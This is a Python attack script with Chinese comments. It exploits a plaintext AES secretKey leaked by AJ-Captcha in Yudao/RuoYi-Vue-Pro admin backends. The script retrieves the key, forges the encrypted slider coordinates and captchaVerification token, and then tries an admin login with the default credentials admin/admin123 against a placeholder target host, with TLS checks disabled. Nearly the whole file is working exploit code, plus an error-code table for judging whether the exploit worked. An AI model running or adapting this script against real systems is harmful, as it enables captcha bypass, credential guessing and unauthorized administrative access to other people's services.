#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AJ-Captcha 协议复现 + secretKey 泄露利用
适用：芋道 yudao / RuoYi-Vue-Pro / 任何集成 AJ-Captcha 的 Java 后台

原理：
  1. POST {prefix}/system/captcha/get  {"captchaType":"blockPuzzle"}
     → 返回 repData{ secretKey(明文AES密钥), token, originalImageBase64, jigsawImageBase64, captchaId }
  2. pointJson 字段不是明文 JSON，而是 **AES-128-CBC(secretKey 作 key 且作 iv) 加密后 base64**
     明文形如 {"x":105,"y":160}
  3. POST {prefix}/system/captcha/check {"token":..,"pointJson":<base64>,"captchaType":"blockPuzzle"}
     → 成功返回 repCode "0000" 且带 captchaVerification
  4. captchaVerification = AES加密(token + "---" + pointJson明文)
  5. 登录时携带 captchaVerification

错误码速查（用于判断利用状态）：
  0001 "Illegal base64 character"       → pointJson 传了明文 JSON，应传 base64
  0001 "Given final block not padded"   → secretKey/AES 协议正确，解密流程已走通（但数据异常）
  6110 "验证码已失效"                    → 服务端缓存中没有该 token 记录
  1002000004 登录接口返回                → 验证码校验未通过

# 关键坑：captchaId 为 null 时说明服务端缓存层（Redis）未正常工作，
# 此时无论怎么构造都会落回 6110，属于服务端部署缺陷，不是可绕过点。
"""
import http.client, json, ssl, base64, sys
from Crypto.Cipher import AES

HOST = "TARGET_HOST"      # 目标 IP
PREFIX = "/admin-api"     # 芋道管理端常用；会员端为 /app-api
VHOST = "admin.example.com"  # 按需，若为直连 IP 可省略 Host
TENANT = "1"

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def req(method, path, body=None, scheme="https", port=443):
    if scheme == "https":
        c = http.client.HTTPSConnection(HOST, port, timeout=15, context=ctx)
    else:
        c = http.client.HTTPConnection(HOST, port, timeout=15)
    h = {"Content-Type":"application/json","tenant-id":TENANT,"Connection":"close"}
    if VHOST: h["Host"] = VHOST
    c.request(method, path, json.dumps(body) if body is not None else None, h)
    r = c.getresponse(); d = r.read().decode("utf-8","ignore"); c.close()
    return r.status, d

def aes_enc(plain: str, key: str) -> str:
    kb = key.encode()[:16].ljust(16, b"\0")
    pad = 16 - (len(plain.encode()) % 16)
    data = plain.encode() + bytes([pad])*pad
    return base64.b64encode(AES.new(kb, AES.MODE_CBC, kb).encrypt(data)).decode()

def get_captcha(captcha_type="blockPuzzle"):
    s, d = req("POST", f"{PREFIX}/system/captcha/get", {"captchaType": captcha_type})
    j = json.loads(d); rd = j.get("repData", {})
    return rd

def check(token, point_json_b64, captcha_type="blockPuzzle"):
    s, d = req("POST", f"{PREFIX}/system/captcha/check",
               {"token": token, "pointJson": point_json_b64, "captchaType": captcha_type})
    return d

def login(username, password, captcha_verification):
    s, d = req("POST", f"{PREFIX}/system/auth/login",
               {"username": username, "password": password,
                "captchaVerification": captcha_verification})
    return d

if __name__ == "__main__":
    rd = get_captcha()
    print("captchaId =", rd.get("captchaId"), " <-- null 表示服务端缓存层异常")
    print("secretKey =", rd.get("secretKey"))
    tok = rd.get("token"); sk = rd.get("secretKey")
    if not tok or not sk:
        print("未取到 token/secretKey，检查 PREFIX 与 Host"); sys.exit(1)
    pj_plain = json.dumps({"x": 0, "y": 0}, separators=(',', ':'))
    print("check ->", check(tok, aes_enc(pj_plain, sk))[:200])
    cv = aes_enc(tok + "---" + pj_plain, sk)
    print("login ->", login("admin", "admin123", cv)[:200])
